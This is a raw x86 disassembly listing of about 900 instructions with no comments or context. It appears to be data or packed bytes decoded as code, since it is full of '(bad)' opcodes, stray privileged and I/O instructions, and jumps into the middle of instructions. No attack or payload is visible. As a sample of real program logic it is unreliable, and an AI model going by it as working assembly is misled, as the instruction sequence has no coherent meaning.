  413a81:	mov    es,WORD PTR [edi+0x1c]
  413a84:	inc    edx
  413a85:	cmp    DWORD PTR [edi-0x1f90bfbb],0x61
  413a8c:	aas    
  413a8d:	dec    edi
  413a8e:	mov    dh,0x6e
  413a90:	inc    ecx
  413a91:	aam    0x9
  413a93:	mov    cl,0x1b
  413a95:	fsubr  QWORD PTR [ecx]
  413a97:	retf   
  413a98:	stc    
  413a99:	loop   0x413a99
  413a9b:	mov    al,0xc3
  413a9d:	(bad)  
  413a9f:	mov    al,ds:0x2d218a7c
  413aa4:	mov    es,WORD PTR [ebp+0x3f6fdbc0]
  413aaa:	stc    
  413aab:	or     eax,0x57287a19
  413ab0:	pop    eax
  413ab1:	sbb    bl,BYTE PTR [ecx+edi*2]
  413ab4:	enter  0xc998,0x46
  413ab8:	(bad)  
  413ab9:	jnp    0x413aff
  413abb:	ins    BYTE PTR es:[edi],dx
  413abc:	jl     0x413b07
  413abe:	arpl   WORD PTR [ebx+0x5d3f87ed],ax
  413ac4:	mov    bh,0xf3
  413ac6:	cmc    
  413ac7:	fst    QWORD PTR [ebp+esi*1+0x1bca2ca5]
  413ace:	sbb    ecx,DWORD PTR [ecx+esi*4+0x2ac92c7b]
  413ad5:	pop    eax
  413ad6:	test   eax,0x7b85cb90
  413adb:	or     ebp,esi
  413add:	mov    ds:0x7e68105d,al
  413ae2:	jmp    0x2d33580
  413ae7:	dec    eax
  413ae8:	sbb    eax,0xf8d870f1
  413aed:	pop    esp
  413aee:	stos   BYTE PTR es:[edi],al
  413aef:	and    bh,bl
  413af1:	(bad)  
  413af2:	shl    DWORD PTR [edx-0x64ee37bb],cl
  413af8:	mov    ecx,0x3294fe94
  413afd:	pop    ebp
  413afe:	clc    
  413aff:	int3   
  413b00:	xchg   BYTE PTR [esi],bh
  413b02:	xchg   edx,eax
  413b03:	sti    
  413b04:	lahf   
  413b05:	sbb    DWORD PTR [eax+0x32],esi
  413b08:	out    dx,eax
  413b09:	sbb    ecx,DWORD PTR ds:0x53c3c065
  413b0f:	cmp    ebx,edi
  413b11:	ds gs dec ebp
  413b14:	inc    ebx
  413b15:	or     DWORD PTR [eax-0x2a],esp
  413b18:	pop    edx
  413b19:	dec    eax
  413b1a:	mov    dh,0x65
  413b1c:	not    DWORD PTR [esp+ebx*2]
  413b1f:	xchg   esp,eax
  413b20:	jmp    0xd549:0xd9219a0
  413b27:	(bad)  
  413b28:	push   ecx
  413b29:	mov    eax,0xad6ee890
  413b2e:	(bad)  
  413b2f:	or     al,0x24
  413b31:	pop    esi
  413b32:	scas   eax,DWORD PTR es:[edi]
  413b33:	in     eax,0x4d
  413b35:	das    
  413b36:	(bad)  
  413b37:	mov    al,0x38
  413b39:	inc    ecx
  413b3a:	hlt    
  413b3b:	sub    ch,BYTE PTR [ebx]
  413b3d:	pushf  
  413b3e:	iret   
  413b3f:	outs   dx,DWORD PTR ds:[esi]
  413b40:	mov    gs,WORD PTR [ecx-0x2b72e7f2]
  413b46:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413b48:	adc    eax,0x16380f0d
  413b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b4e:	push   edi
  413b4f:	(bad)  
  413b50:	cli    
  413b51:	cwde   
  413b52:	mov    ds:0x4475c8de,al
  413b57:	add    bh,bl
  413b59:	dec    edx
  413b5a:	test   DWORD PTR [ebx+0x24],esi
  413b5d:	mov    edi,DWORD PTR [ebx+ebx*4+0x4aaed82c]
  413b64:	enter  0x3f43,0x19
  413b68:	mov    bl,0x6b
  413b6a:	jg     0x413b57
  413b6c:	ror    ecx,cl
  413b6e:	dec    ebp
  413b6f:	ficomp WORD PTR [esi-0x48877745]
  413b75:	pusha  
  413b76:	dec    ebp
  413b77:	dec    eax
  413b78:	pop    esp
  413b79:	pop    ds
  413b7a:	je     0x413b65
  413b7c:	sub    ah,BYTE PTR [esi-0x480a2b56]
  413b82:	xor    ebx,edx
  413b84:	dec    ecx
  413b85:	into   
  413b86:	add    ah,dh
  413b88:	push   esi
  413b89:	ss jl  0x413bd7
  413b8c:	ror    BYTE PTR [ecx+0x3cd750ae],1
  413b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b93:	jge    0x413b5b
  413b95:	and    ebp,edx
  413b97:	out    0xed,al
  413b99:	sub    bl,BYTE PTR [ecx-0x3f]
  413b9c:	mov    ds:0x938dcf4f,al
  413ba1:	sub    al,0x99
  413ba3:	clc    
  413ba4:	addr16 ret 
  413ba6:	retf   
  413ba7:	push   edx
  413ba8:	in     eax,dx
  413ba9:	ret    0x27c2
  413bac:	popf   
  413bad:	push   cs
  413bae:	mov    dl,0x3c
  413bb0:	retf   
  413bb1:	mov    dh,0x81
  413bb3:	inc    edi
  413bb4:	push   edi
  413bb5:	daa    
  413bb6:	xchg   ebp,eax
  413bb7:	mov    cl,0x52
  413bb9:	push   es
  413bba:	adc    esp,DWORD PTR [edi+eiz*1-0x35]
  413bbe:	mov    DWORD PTR [eax*8+0x931e57d],ebx
  413bc5:	daa    
  413bc6:	iret   
  413bc7:	add    eax,0x5a4ea5f0
  413bcc:	div    esp
  413bce:	dec    edi
  413bcf:	stos   DWORD PTR es:[edi],eax
  413bd0:	or     ah,dl
  413bd2:	mov    dh,0x41
  413bd4:	sub    dh,ch
  413bd6:	cld    
  413bd7:	cli    
  413bd8:	xor    al,0xf3
  413bda:	mov    bh,0xcf
  413bdc:	jg     0x413b90
  413bde:	push   edx
  413bdf:	adc    al,0xb6
  413be1:	daa    
  413be2:	pop    edi
  413be3:	fdivr  DWORD PTR [eax-0x572037b]
  413be9:	adc    al,0xad
  413beb:	out    0x8e,al
  413bed:	mov    eax,ds:0xf0a8d485
  413bf2:	mov    bl,0x45
  413bf4:	pushf  
  413bf5:	ret    0x6ecd
  413bf8:	call   0xc746b0e5
  413bfd:	call   0x59f65394
  413c02:	stc    
  413c03:	int    0x8f
  413c05:	mov    ebp,0xcfeae48d
  413c0a:	stc    
  413c0b:	mov    bl,0xa1
  413c0d:	daa    
  413c0e:	icebp  
  413c0f:	in     al,0x53
  413c11:	arpl   dx,di
  413c13:	mov    DWORD PTR [ebp-0x2832ce21],ecx
  413c19:	sub    DWORD PTR [eax+0x4f],ebp
  413c1c:	jge    0x413c03
  413c1e:	pop    eax
  413c1f:	fsub   QWORD PTR [esi-0x76]
  413c22:	xchg   ebx,eax
  413c23:	xchg   ebp,eax
  413c24:	leave  
  413c25:	lea    edx,[eax]
  413c27:	add    BYTE PTR [ebp+0x7248d0e2],al
  413c2d:	in     al,dx
  413c2e:	add    esi,DWORD PTR [eax]
  413c30:	call   0xb2b4:0x19203c24
  413c37:	enter  0xafcf,0xa1
  413c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c3c:	daa    
  413c3d:	repnz mov gs:0x4b3427,eax
  413c44:	in     eax,0xee
  413c46:	ins    DWORD PTR es:[edi],dx
  413c47:	pop    ebp
  413c48:	adc    BYTE PTR [edi],ah
  413c4a:	pop    edx
  413c4b:	jbe    0x413c48
  413c4d:	retf   0xee65
  413c50:	sub    BYTE PTR [edi],al
  413c52:	test   al,dh
  413c54:	jo     0x413c69
  413c56:	sbb    bh,bh
  413c58:	jae    0x413bdf
  413c5a:	dec    ecx
  413c5b:	leave  
  413c5c:	(bad)  
  413c5d:	dec    ebx
  413c5e:	shr    BYTE PTR [edi-0x65911c65],cl
  413c64:	fadd   st(2),st
  413c66:	push   cs
  413c67:	pop    ecx
  413c68:	and    eax,0x2f9ff32e
  413c6d:	inc    ecx
  413c6e:	iret   
  413c6f:	adc    eax,0x8fd41c95
  413c74:	mov    ds:0xb4a5cc61,eax
  413c79:	mov    esp,0xdc45a539
  413c7e:	cmp    ebp,ebx
  413c80:	out    0xf,al
  413c82:	cli    
  413c83:	lods   eax,DWORD PTR ds:[esi]
  413c84:	push   0xa
  413c86:	inc    ebp
  413c87:	push   0x6c
  413c89:	stos   DWORD PTR es:[edi],eax
  413c8a:	mov    esp,0x1675581
  413c8f:	stos   BYTE PTR es:[edi],al
  413c90:	gs mov ebx,0xa623f425
  413c96:	mul    BYTE PTR [edx+0x68cff66f]
  413c9c:	pop    ebp
  413c9d:	test   DWORD PTR [ecx+0x37a1a7d4],0x39b58339
  413ca7:	in     al,0x42
  413ca9:	sti    
  413caa:	mov    esp,esp
  413cac:	sbb    al,0xf0
  413cae:	dec    eax
  413caf:	cmp    eax,0xb7166576
  413cb4:	push   0x52
  413cb6:	and    al,0xd6
  413cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cb9:	rol    DWORD PTR [edi-0x47c55972],0x6f
  413cc0:	mov    dh,BYTE PTR [edi-0x45]
  413cc3:	push   DWORD PTR [ebx+ecx*4-0x5991172c]
  413cca:	mov    esi,0x28a2506e
  413ccf:	cmc    
  413cd0:	xor    BYTE PTR [ebx+0x46],cl
  413cd3:	and    DWORD PTR [ebp+0x1ddcdedf],edx
  413cd9:	(bad)  
  413cda:	adc    BYTE PTR [ecx-0x4ce3e321],ah
  413ce0:	dec    edi
  413ce1:	aam    0x64
  413ce3:	ss jmp 0x413c6e
  413ce6:	fucomp st(5)
  413ce8:	aam    0x8e
  413cea:	mov    ds:0x9711c79,al
  413cef:	loop   0x413cda
  413cf1:	adc    BYTE PTR [ebx+0x40b7c6f0],ch
  413cf7:	scas   al,BYTE PTR es:[edi]
  413cf8:	aaa    
  413cf9:	mov    BYTE PTR [eax],dl
  413cfb:	and    BYTE PTR [ebx+0x6b],al
  413cfe:	stos   BYTE PTR es:[edi],al
  413cff:	aas    
  413d00:	push   cs
  413d01:	jmp    0x413cd2
  413d03:	jmp    0x413ced
  413d05:	int    0x4f
  413d07:	sbb    ebp,esi
  413d09:	sbb    BYTE PTR [esi],bh
  413d0b:	sbb    al,0x9
  413d0d:	xchg   edi,eax
  413d0e:	push   ebp
  413d0f:	ror    DWORD PTR [edx-0x37],1
  413d12:	mov    edi,0x9f58679d
  413d17:	stos   BYTE PTR es:[edi],al
  413d18:	aaa    
  413d19:	test   al,0xe6
  413d1b:	in     eax,dx
  413d1c:	mov    bh,0x44
  413d1e:	test   BYTE PTR [edx],al
  413d20:	aam    0x95
  413d22:	push   esp
  413d23:	repz (bad) 
  413d25:	push   edx
  413d26:	ins    DWORD PTR es:[edi],dx
  413d27:	jle    0x413d03
  413d29:	xor    BYTE PTR [edx],dh
  413d2b:	pop    edi
  413d2c:	dec    eax
  413d2d:	call   0xcfc59042
  413d32:	mov    ebx,0x8d5fd5f3
  413d37:	addr16 addr16 sub eax,0x379b5704
  413d3e:	aad    0xc0
  413d40:	mov    al,ds:0xb790d4e1
  413d45:	ds scas al,BYTE PTR es:[edi]
  413d47:	mov    edx,0x6c0ed352
  413d4c:	je     0x413d73
  413d4e:	fiadd  WORD PTR [esi-0x2e47a037]
  413d54:	retf   
  413d55:	mov    cl,0xa5
  413d57:	inc    esp
  413d58:	mov    cl,0xd0
  413d5a:	(bad)  
  413d5b:	das    
  413d5c:	mov    ds:0x62f4daf9,eax
  413d61:	loop   0x413d0b
  413d63:	call   0x6246150e
  413d68:	xchg   esp,eax
  413d69:	leave  
  413d6a:	and    eax,0x8ed20883
  413d6f:	mov    bl,0x80
  413d71:	fist   DWORD PTR [edi+0x72ca2f5d]
  413d77:	jl     0x413d70
  413d79:	imul   BYTE PTR [ebx+ecx*8]
  413d7c:	fdivr  QWORD PTR [ecx-0x171f6a48]
  413d82:	mov    esi,edx
  413d84:	lods   eax,DWORD PTR ds:[esi]
  413d85:	sbb    al,0x9c
  413d87:	xchg   ebx,eax
  413d88:	or     esi,DWORD PTR [ecx+ecx*8]
  413d8b:	dec    edi
  413d8c:	loope  0x413d3e
  413d8e:	jb     0x413dbf
  413d90:	lods   al,BYTE PTR ds:[esi]
  413d91:	pop    ss
  413d92:	fild   DWORD PTR [esi-0x1f0ab0e7]
  413d98:	push   0xe2b829d8
  413d9d:	inc    ebx
  413d9e:	inc    ebx
  413d9f:	mov    ebp,0x7ca1882c
  413da4:	jo     0x413dbe
  413da6:	xchg   edx,eax
  413da7:	xor    al,0x11
  413da9:	fnsave [ecx-0x27]
  413dac:	popf   
  413dad:	mov    esi,0x947dfd95
  413db2:	mov    bh,0xaa
  413db4:	jbe    0x413e26
  413db6:	cwde   
  413db7:	mov    bh,0xcd
  413db9:	(bad)  
  413dba:	out    dx,eax
  413dbb:	dec    ecx
  413dbc:	jecxz  0x413e2e
  413dbe:	cmc    
  413dbf:	sbb    eax,0x7781135c
  413dc4:	or     al,0x7f
  413dc6:	cmp    eax,0xed7feb69
  413dcb:	push   ebx
  413dcc:	inc    edx
  413dcd:	(bad)  
  413dce:	cli    
  413dcf:	mov    ebp,0x989dd67a
  413dd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dd5:	fidiv  WORD PTR [edi+0x8507d0f]
  413ddb:	or     al,0x61
  413dde:	cmp    esi,edi
  413de0:	sbb    eax,0x6caabcb5
  413de5:	inc    ebp
  413de6:	xchg   edx,eax
  413de7:	arpl   cx,di
  413de9:	add    ah,BYTE PTR [esi+0x73]
  413dec:	push   cs
  413ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dee:	fmul   QWORD PTR ds:0x6d82f38e
  413df4:	cli    
  413df5:	inc    ebx
  413df6:	jle    0x413de1
  413df8:	or     DWORD PTR [edx-0x48b94eee],0xa6a3c2b0
  413e02:	jbe    0x413e11
  413e04:	cs popa 
  413e06:	jmp    0x413dc2
  413e08:	loop   0x413e43
  413e0a:	sub    BYTE PTR [eax*2+0x2e106d8b],al
  413e11:	out    dx,eax
  413e12:	ret    0xc518
  413e15:	clc    
  413e16:	push   edi
  413e17:	sbb    edx,DWORD PTR [edi+0x33]
  413e1a:	jae    0x413e18
  413e1c:	inc    ecx
  413e1d:	ds jbe 0x413dad
  413e20:	mov    al,0x7a
  413e22:	arpl   WORD PTR [eax-0x2a64f241],dx
  413e28:	adc    ah,bh
  413e2a:	or     ebx,DWORD PTR [edx-0x2f]
  413e2d:	jmp    FWORD PTR [edx+ebx*2-0x74]
  413e31:	mov    BYTE PTR [eax+0x61c219d1],0x14
  413e38:	push   edx
  413e39:	retf   
  413e3a:	repnz imul ecx,DWORD PTR [edi+esi*2-0x13],0x19
  413e40:	mov    ah,0x69
  413e42:	sahf   
  413e43:	fld    QWORD PTR [esi+eiz*2]
  413e46:	jp     0x413e0a
  413e48:	mov    cl,0x5f
  413e4a:	iret   
  413e4b:	int3   
  413e4c:	adc    eax,0x56dc4f7f
  413e51:	xchg   BYTE PTR [edi+0x65],dh
  413e54:	xor    DWORD PTR [ebx-0x3],0x43
  413e58:	xor    ah,ah
  413e5a:	mov    dh,0xe3
  413e5c:	jl     0x413de5
  413e5e:	ret    
  413e5f:	and    BYTE PTR ds:0xe75c6fe7,ah
  413e65:	mov    ?,WORD PTR [edx]
  413e67:	fabs   
  413e69:	push   ecx
  413e6a:	lods   al,BYTE PTR ds:[esi]
  413e6b:	xchg   ebp,ebx
  413e6d:	push   cs
  413e6e:	adc    edx,DWORD PTR [edi-0x5503777]
  413e74:	fwait
  413e75:	inc    edi
  413e76:	adc    eax,0x7d839bb2
  413e7b:	inc    eax
  413e7c:	in     eax,0x6c
  413e7e:	loope  0x413e00
  413e80:	add    al,0x14
  413e82:	es push ebp
  413e84:	jmp    0x1701:0x821e45d0
  413e8b:	dec    esi
  413e8c:	mov    fs,edi
  413e8e:	push   ss
  413e8f:	loope  0x413ed7
  413e91:	mov    edi,0x9997f140
  413e96:	push   0x78
  413e98:	add    al,0xc6
  413e9a:	js     0x413ec0
  413e9c:	loopne 0x413eb7
  413e9e:	cs popf 
  413ea0:	imul   edx,DWORD PTR [edx+0x16456a7b],0xffffffc2
  413ea7:	pusha  
  413ea8:	and    eax,0xffc9c5ce
  413ead:	cmc    
  413eae:	sub    al,0x1f
  413eb0:	aad    0x6e
  413eb2:	adc    DWORD PTR [esi-0x50],ecx
  413eb5:	sbb    dl,BYTE PTR [edi+0x68]
  413eb8:	repnz mov ebx,0x36d451b9
  413ebe:	pop    ebx
  413ebf:	ror    BYTE PTR [esi+0x79],cl
  413ec2:	push   esi
  413ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ec4:	mov    dl,0x9b
  413ec6:	aam    0xe9
  413ec8:	lock dec ecx
  413eca:	lods   eax,DWORD PTR ds:[esi]
  413ecb:	bnd ret 0x1fb0
  413ecf:	(bad)  
  413ed0:	sbb    eax,0x299f1a40
  413ed5:	hlt    
  413ed6:	loopne 0x413ea8
  413ed8:	retf   0x8d99
  413edb:	gs loopne 0x413eda
  413ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413edf:	jmp    0x413ed5
  413ee1:	inc    edi
  413ee2:	push   ss
  413ee3:	out    dx,eax
  413ee4:	rcl    dh,0x49
  413ee7:	dec    edi
  413ee8:	sbb    dl,ah
  413eea:	aam    0x29
  413eec:	jecxz  0x413eb1
  413eee:	fstp   DWORD PTR [ecx]
  413ef0:	mov    al,0xae
  413ef2:	pop    eax
  413ef3:	icebp  
  413ef4:	out    0x70,eax
  413ef6:	adc    ebx,DWORD PTR [eax-0xf]
  413ef9:	stc    
  413efa:	lods   eax,DWORD PTR ds:[esi]
  413efb:	xchg   esi,eax
  413efc:	jecxz  0x413e8e
  413efe:	jmp    0x413efd
  413f00:	cmp    BYTE PTR [edi+0x194ac0ff],dl
  413f06:	or     al,0x59
  413f08:	xchg   ecx,eax
  413f09:	mov    dl,0xdc
  413f0b:	adc    bl,0xa9
  413f0e:	sub    al,0x51
  413f10:	inc    eax
  413f11:	shl    DWORD PTR [ecx+0x3b],cl
  413f14:	mov    BYTE PTR [esi-0x8535216],bl
  413f1a:	add    dh,BYTE PTR ds:0xb21f9546
  413f20:	cmp    ch,BYTE PTR [edx+0x5b]
  413f23:	bnd ret 0x34c9
  413f27:	lock jecxz 0x413f77
  413f2a:	aam    0xe
  413f2c:	and    al,0x49
  413f2e:	lods   al,BYTE PTR ds:[esi]
  413f2f:	pop    esi
  413f30:	pop    ecx
  413f31:	jmp    0x413f91
  413f33:	(bad)  
  413f34:	aam    0xd
  413f36:	dec    esi
  413f37:	mov    esp,0xfab22e93
  413f3c:	(bad)  
  413f3d:	adc    al,0xa0
  413f3f:	sbb    eax,0xbb9508a5
  413f44:	lds    ebp,FWORD PTR [ebx]
  413f46:	xchg   esp,eax
  413f47:	adc    BYTE PTR [ebp+0x7c6d82b3],ch
  413f4d:	and    ebx,DWORD PTR [ecx+0x68ca6265]
  413f53:	pop    edi
  413f54:	mov    edx,0x9048da32
  413f59:	ficomp DWORD PTR [edi+eax*1+0x3e8c931d]
  413f60:	xor    eax,0xa242f809
  413f65:	clc    
  413f66:	xchg   ebx,eax
  413f67:	rcl    DWORD PTR [eax-0x35],1
  413f6a:	lahf   
  413f6b:	sub    BYTE PTR [eax+0x0],ah
  413f6e:	fsubr  QWORD PTR [edx+0x5e5d8f2b]
  413f74:	xchg   ebx,eax
  413f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f76:	add    eax,0x28f2f7d
  413f7b:	das    
  413f7c:	or     edi,DWORD PTR [esi]
  413f7e:	sbb    eax,0xd95df862
  413f83:	xchg   edi,eax
  413f84:	outs   dx,BYTE PTR ds:[esi]
  413f85:	cmp    eax,0x9fb4b75b
  413f8a:	adc    ebx,eax
  413f8c:	dec    ecx
  413f8d:	iret   
  413f8e:	addr16 mov ah,0xcb
  413f91:	xchg   BYTE PTR [ebp+0x4c],ch
  413f94:	jg     0x413f31
  413f96:	sbb    ch,BYTE PTR [edi]
  413f98:	test   bl,dl
  413f9a:	and    al,0xeb
  413f9c:	add    dh,al
  413f9e:	sbb    BYTE PTR [esi],0xb4
  413fa1:	add    cl,BYTE PTR [ebx-0x4a6f7bf1]
  413fa7:	popf   
  413fa8:	retf   0xb5b5
  413fab:	clc    
  413fac:	repz jecxz 0x413f54
  413faf:	push   cs
  413fb0:	cld    
  413fb1:	or     dl,BYTE PTR [ebp*8-0x272a4210]
  413fb8:	pushf  
  413fb9:	mov    edi,0xc38e50d4
  413fbe:	sub    esp,DWORD PTR [edi]
  413fc0:	fcomip st,st(0)
  413fc2:	mov    esp,esi
  413fc4:	cmp    ebp,ecx
  413fc6:	sti    
  413fc7:	sbb    cl,BYTE PTR [edx+0x27e57e72]
  413fcd:	fdiv   QWORD PTR [ebp-0x7a0f4c04]
  413fd3:	in     eax,dx
  413fd4:	aaa    
  413fd5:	xchg   edi,eax
  413fd6:	cwde   
  413fd7:	push   cs
  413fd8:	fld    QWORD PTR [ebx]
  413fda:	leave  
  413fdb:	aam    0x6f
  413fdd:	push   ecx
  413fde:	and    eax,0xfc9945fd
  413fe3:	fisubr DWORD PTR [eax-0x73]
  413fe6:	mov    bh,0x82
  413fe8:	xlat   BYTE PTR ds:[ebx]
  413fe9:	dec    esi
  413fea:	jl     0x413fc0
  413fec:	popa   
  413fed:	adc    al,BYTE PTR [edi+0x48]
  413ff0:	shl    DWORD PTR [edi+0x79],cl
  413ff3:	lds    ebp,FWORD PTR [di+0x35]
  413ff7:	lods   eax,DWORD PTR ds:[esi]
  413ff8:	push   ebp
  413ff9:	cmc    
  413ffa:	test   eax,0x69c3a92e
  413fff:	mov    al,0x82
  414001:	adc    ebx,DWORD PTR [eax]
  414003:	shl    BYTE PTR [ebp+0x5fc66a15],0xb2
  41400a:	jb     0x413fca
  41400c:	lods   al,BYTE PTR ds:[esi]
  41400d:	outs   dx,DWORD PTR ds:[esi]
  41400e:	mov    ch,0xb4
  414010:	inc    ebp
  414011:	adc    al,0x43
  414013:	aas    
  414014:	int    0x31
  414016:	les    ebp,FWORD PTR [esi]
  414018:	jns    0x41408e
  41401a:	xchg   BYTE PTR [ebp-0x2ef70ee7],al
  414020:	dec    ecx
  414021:	xor    ebp,esi
  414023:	test   eax,0x7e153382
  414028:	mov    BYTE PTR ds:0x35c29c40,bh
  41402e:	mov    dl,0xbc
  414030:	int    0xde
  414032:	ins    BYTE PTR es:[edi],dx
  414033:	stos   BYTE PTR es:[edi],al
  414034:	out    0xf5,al
  414036:	fsubrp st(0),st
  414038:	adc    al,0x52
  41403a:	inc    ebp
  41403b:	(bad)  
  41403c:	and    ah,BYTE PTR [edi+0x7a01bdd3]
  414042:	xchg   ecx,eax
  414043:	xor    DWORD PTR [esi-0x6ba8203e],eax
  414049:	xchg   esi,eax
  41404a:	or     DWORD PTR [edx],0x88933725
  414050:	mov    al,0x2
  414052:	gs stos DWORD PTR es:[edi],eax
  414054:	jmp    0x6091:0xbfce
  41405a:	push   0x1c9197c1
  41405f:	pop    ecx
  414060:	in     eax,dx
  414061:	outs   dx,BYTE PTR ds:[esi]
  414062:	dec    ecx
  414063:	xor    esp,ecx
  414065:	add    edi,ecx
  414067:	gs mov esi,0x595ca8bb
  41406d:	clc    
  41406e:	cwde   
  41406f:	or     BYTE PTR [edi-0x5cc1a42a],0x14
  414076:	xchg   esp,eax
  414077:	and    eax,0xccbe6d3e
  41407c:	call   0x82f06381
  414081:	push   edi
  414082:	push   eax
  414083:	outs   dx,BYTE PTR ds:[esi]
  414084:	sub    edi,DWORD PTR [ebp-0x49]
  414087:	jmp    0x41403a
  414089:	and    al,0xd
  41408b:	push   0x2b
  41408d:	xchg   BYTE PTR [eax+0x5d],cl
  414090:	lea    esp,[edi-0x4e9245bc]
  414096:	sub    esp,DWORD PTR [esi+0x57]
  414099:	dec    edx
  41409a:	mov    esi,0xc33599ef
  41409f:	push   eax
  4140a0:	push   esp
  4140a1:	pop    esi
  4140a2:	adc    eax,0x12f61de3
  4140a7:	lahf   
  4140a8:	jo     0x414031
  4140aa:	fucompp 
  4140ac:	scas   eax,DWORD PTR es:[edi]
  4140ad:	add    eax,0x3485a95e
  4140b2:	jno    0x4140ae
  4140b4:	iret   
  4140b5:	xor    al,0xa4
  4140b7:	jecxz  0x414080
  4140b9:	out    0x7,eax
  4140bb:	xor    BYTE PTR [edx],bh
  4140bd:	sub    ebp,esi
  4140bf:	rol    DWORD PTR [esi-0x4c],0x84
  4140c3:	mov    esp,0xe021837a
  4140c8:	dec    ecx
  4140c9:	hlt    
  4140ca:	divps  xmm4,XMMWORD PTR [ebp+0x13]
  4140ce:	xchg   edx,eax
  4140cf:	push   es
  4140d0:	inc    eax
  4140d1:	pop    edx
  4140d2:	jno    0x4140a0
  4140d4:	jo     0x41407a
  4140d6:	mov    bl,0xd8
  4140d8:	ds emms 
  4140db:	int3   
  4140dc:	ins    DWORD PTR es:[edi],dx
  4140dd:	dec    ebx
  4140de:	xchg   ebx,eax
  4140df:	xchg   DWORD PTR [edi],ecx
  4140e1:	jno    0x4140c6
  4140e3:	xchg   edi,eax
  4140e4:	mov    dh,0xb2
  4140e6:	sbb    eax,0x29629d18
  4140eb:	enter  0x1850,0xbb
  4140ef:	inc    edx
  4140f0:	rcl    DWORD PTR [edx+0x7c],1
  4140f3:	imul   ebx,DWORD PTR [ecx+0x12],0xffffff96
  4140f7:	dec    edx
  4140f8:	mov    eax,ds:0x6eddb9dd
  4140fd:	out    dx,al
  4140fe:	popf   
  4140ff:	mov    dh,0x20
  414101:	inc    esp
  414102:	iret   
  414103:	dec    eax
  414104:	pop    edx
  414105:	mov    ebx,0x5e9ca7b4
  41410a:	cdq    
  41410b:	xchg   edx,eax
  41410c:	neg    BYTE PTR [ebx-0x4c]
  41410f:	jns    0x4140df
  414111:	xchg   dh,bl
  414113:	mov    esi,0x517d1340
  414118:	or     esi,eax
  41411a:	shl    DWORD PTR [esi-0x7355e2b7],1
  414120:	add    al,BYTE PTR [eax+0x5a]
  414123:	and    DWORD PTR [esi],ecx
  414125:	pop    bp
  414127:	and    edi,DWORD PTR [eax+0x67f5bb2d]
  41412d:	xchg   edi,eax
  41412e:	jg     0x41410a
  414130:	push   edi
  414131:	lds    esi,FWORD PTR [ecx]
  414133:	xor    edi,edi
  414135:	mov    bl,0x6c
  414137:	inc    eax
  414138:	sbb    BYTE PTR [ecx+0x3a],bl
  41413b:	arpl   WORD PTR [edi-0x4a567a1b],di
  414141:	xor    edx,esp
  414143:	sub    al,0xa3
  414145:	mov    ebx,0xecbde4f3
  41414a:	fnstsw WORD PTR ds:0x96a2b286
  414150:	pop    ecx
  414151:	pextrw eax,(bad),0xc5
  414153:	and    ah,0xfc
  414156:	jmp    0xdb3d16ae
  41415b:	loope  0x4141aa
  41415d:	sti    
  41415e:	retf   
  41415f:	xor    al,0xc6
  414161:	mov    esi,0x697fef42
  414166:	outs   dx,DWORD PTR ds:[esi]
  414167:	jmp    0x414185
  414169:	outs   dx,DWORD PTR ds:[esi]
  41416a:	push   edi
  41416b:	jg     0x414123
  41416d:	ja     0x4141bb
  41416f:	arpl   bp,sp
  414171:	xchg   esi,eax
  414172:	outs   dx,DWORD PTR ds:[esi]
  414173:	popa   
  414174:	dec    ebp
  414175:	gs popa 
  414177:	mov    ?,WORD PTR [ecx]
  414179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41417a:	and    al,0x15
  41417c:	sti    
  41417d:	out    0xb9,al
  41417f:	or     esp,eax
  414181:	mov    bh,0x8e
  414183:	cwde   
  414184:	sub    cl,bh
  414186:	sahf   
  414187:	sbb    dl,BYTE PTR [ecx+0x13]
  41418a:	in     eax,0x39
  41418c:	xchg   BYTE PTR [ecx-0x56ed78e7],bh
  414192:	and    al,0x7f
  414194:	shl    DWORD PTR [edi],1
  414196:	fld    TBYTE PTR [ebx]
  414198:	dec    edi
  414199:	js     0x4141b9
  41419b:	lock xor bh,BYTE PTR [esp+ecx*8]
  41419f:	ret    
  4141a0:	sbb    DWORD PTR [edx],edi
  4141a2:	(bad)  
  4141a3:	stc    
  4141a4:	xor    DWORD PTR [eax-0x3],edx
  4141a7:	sub    eax,0xaab76f76
  4141ac:	clc    
  4141ad:	sub    DWORD PTR [ecx],0x602c180c
  4141b3:	stos   DWORD PTR es:[edi],eax
  4141b4:	mov    bl,0xe9
  4141b6:	dec    esi
  4141b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141b8:	aam    0x6
  4141ba:	or     edi,edi
  4141bc:	or     DWORD PTR [ebx],esp
  4141be:	jns    0x414239
  4141c0:	jg     0x4141d8
  4141c2:	fmul   QWORD PTR [edx-0x13b5b76b]
  4141c8:	xchg   ebp,eax
  4141c9:	popa   
  4141ca:	dec    edx
  4141cb:	pop    edi
  4141cc:	pop    esp
  4141cd:	repz test al,0xeb
  4141d0:	lock add eax,DWORD PTR [edi]
  4141d3:	xor    eax,0x9897e05e
  4141d8:	js     0x4141e7
  4141da:	adc    BYTE PTR [eax],bh
  4141dc:	(bad)  
  4141dd:	or     al,0x65
  4141df:	scas   al,BYTE PTR es:[edi]
  4141e0:	daa    
  4141e1:	imul   ebp,DWORD PTR [esi],0xffffffd4
  4141e4:	pop    edi
  4141e5:	and    BYTE PTR [ecx-0x77],al
  4141e8:	mov    dh,0x64
  4141ea:	inc    eax
  4141eb:	popa   
  4141ec:	inc    dx
  4141ee:	gs std 
  4141f0:	jae    0x4141f2
  4141f2:	sbb    BYTE PTR [ebp+eax*4+0x54de5879],dl
  4141f9:	fdivr  DWORD PTR [ebp+0x3d]
  4141fc:	addr16 inc esp
  4141fe:	push   ebx
  4141ff:	sahf   
  414200:	sub    DWORD PTR [edi-0x74],ebx
  414203:	inc    ecx
  414204:	imul   esp,DWORD PTR [eax],0xffffff90
  414207:	(bad)  
  414209:	mov    BYTE PTR [ebx+0x6e],dl
  41420c:	nop
  41420d:	sahf   
  41420e:	fisub  DWORD PTR [esi+0x76]
  414211:	jo     0x41421e
